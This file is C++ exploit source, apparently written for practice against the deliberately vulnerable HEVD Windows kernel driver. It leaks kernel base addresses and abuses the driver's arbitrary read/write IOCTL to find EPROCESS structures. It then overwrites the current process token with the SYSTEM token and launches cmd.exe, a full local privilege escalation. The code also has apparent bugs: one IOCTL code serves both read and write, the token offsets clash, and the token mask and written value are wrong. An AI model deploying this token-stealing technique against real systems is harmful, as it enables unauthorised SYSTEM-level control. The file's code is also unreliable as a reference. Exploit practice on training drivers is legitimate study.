// HEVD_ARBITRARY_WRITE.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <Psapi.h>

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)

#include <iostream>

HANDLE hevd;

typedef struct _ARBITRARY_READ {
	uintptr_t           readAddress;
	uintptr_t           outBuf;
} ARBITRARY_READ;


typedef struct _ARBITRARY_WRITE {
	uintptr_t           value;
	uintptr_t           writeAddress;
} ARBITRARY_WRITE;

DWORD _GetVersion()
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.

	if (dwVersion < 0x80000000)
		dwBuild = (DWORD)(HIWORD(dwVersion));

	printf("Version is %d.%d (%d)\n",
		dwMajorVersion,
		dwMinorVersion,
		dwBuild);

	return dwVersion;
}

LPVOID drivers[0x500] = { 0 }; // Should be more than enough
DWORD cbNeeded;
LPVOID ntoskrnlBase = NULL, hevdBase = NULL;

LPVOID LeakModuleBaseAddress(char* module)
{
	LPVOID moduleBase = NULL;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
			char szDriver[0x100] = { 0 }; // Again, more than enough
			GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
			if (strcmp(module, szDriver) == 0) {
				moduleBase = drivers[i];
				printf("[+] Found %s at: 0x%p\n", module, moduleBase);
			}

			if (moduleBase) break;
		}
	}
	else {
		printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
		return NULL;
	}

	if (!moduleBase) {
		printf("[-] Failed to find the base of %s\n", module);
		return NULL;
	}
	else
	{
		return moduleBase;
	}

}

uint64_t ReadAddress(HANDLE hevd, uint64_t address)
{
	printf("[-] Reading address...\n");

	ARBITRARY_READ aread = {};
	uint64_t ReadValue = 0;
	aread.readAddress = address;
	aread.outBuf = (uint64_t)&ReadValue;
	DWORD BytesReturned;


	bool res = DeviceIoControl(
		hevd,
		0x22200B,
		&aread,
		sizeof(aread),
		NULL,
		0,
		&BytesReturned,
		NULL
	);

	DWORD err = GetLastError();
	printf("[+] DeviceIoControl, error: %p\n", err);


	printf("aread.readAddress: 0x%llx\n", aread.readAddress);
	printf("ReadValue: 0x%llx\n", ReadValue);

	return ReadValue;
}

bool WriteAddress(HANDLE hevd, uint64_t address, uint64_t value)
{
	printf("[-] Reading address...\n");

	ARBITRARY_WRITE write = {};
	uint64_t ReadValue = 0;
	write.writeAddress = address;
	write.value = (uint64_t) &value;
	DWORD BytesReturned;


	bool res = DeviceIoControl(
		hevd,
		0x22200B,
		&write,
		sizeof(write),
		NULL,
		0,
		&BytesReturned,
		NULL
	);

	DWORD err = GetLastError();
	printf("[+] DeviceIoControl, error: %p\n", err);


	printf("write.writeAddress: 0x%llx\n", write.writeAddress);
	printf("write.value: 0x%llx\n", write.value);

	return res;
}

int main()
{
	DWORD version = _GetVersion();

	if (version != 0x23f00206) //Windows 10 21h2 19044.1586
	{
		printf("exploit maybe not supported for this Windows OS. You should verify EPROCESS offsets before running the exploit\n");
		system("pause");
		return -1;
	}

	hevd = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0,
		NULL,
		0x3,
		0,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open", GetLastError());
		return -1;
	}
	else
	{
		printf("[-] Valid handle opened\n");
	}

	HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);

	if (!hNtOsKrnl)
	{
		printf("[-] Cannot load ntoskrnl.exe\n");
		printf("[-] Failed to open %d\n", GetLastError());
	}
	LPVOID moduleBaseNtos = LeakModuleBaseAddress((char*)"ntoskrnl.exe");
	uint64_t PsInitialSystemProcess = (uint64_t)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (uint64_t)hNtOsKrnl + (uint64_t)moduleBaseNtos;
	uint64_t PsInitialSystemProcess2 =  (ULONGLONG)((ULONGLONG)moduleBaseNtos);

	//ntoskrnl resource is no longer needed
	FreeLibrary(hNtOsKrnl);
	printf("[+] Found PsInitialSystemProcess at 0x%p\n", PsInitialSystemProcess);


	//using new handle read PsInitialSystemProcess to get system EPROCESS
	uint64_t SystemEPROCESS = ReadAddress(hevd, PsInitialSystemProcess);
	printf("[+] Found System EPROCESS struct at 0x%p\n", SystemEPROCESS);

	DWORD EPROCESS_ActiveProcessLinks = 0x448;
	DWORD EPROCESS_Token = 0x348;
	DWORD EPROCESS_Token_offset = 0x4b8;
	//from system EPROCESS get ActiveProcessLinks (we need to find our EPROCESS)
	uint64_t readToken = ReadAddress(hevd, SystemEPROCESS + EPROCESS_Token_offset);
	printf("[+] Found System ActiveProcessLinks at 0x%p\n", readToken);

	//steal system token from system EPROCESS
	uint64_t SystemToken = readToken & -0xf;
	printf("[+] Stealing system token 0x%p\n", SystemToken);


	//read current process token

	//now loop through ActiveProcessLinks to find our EPROCESS, UniqueProcessId is always right behind ActiveProcessLinks

	uint64_t ActiveProcessLinks = ReadAddress(hevd, SystemEPROCESS + EPROCESS_ActiveProcessLinks);

	while (true)
	{
		if ((DWORD)ReadAddress(hevd, ActiveProcessLinks - 8) == GetCurrentProcessId())
		{
			//subtract ActiveProcessLinks offset to get EPROCESS
			uint64_t CurrentEPROCESS = ActiveProcessLinks - EPROCESS_ActiveProcessLinks;
			printf("[+] Found current EPROCESS struct at 0x%p\n", CurrentEPROCESS);

			//finally overwrite our token to system one
			printf("[+] Overriding current token now...\n");
			WriteAddress(hevd, CurrentEPROCESS + EPROCESS_Token_offset, SystemToken);

			break; //exit loop
		}

		//not current process, try next one
		ActiveProcessLinks = ReadAddress(hevd, ActiveProcessLinks);
	}

	system("cmd.exe");
}

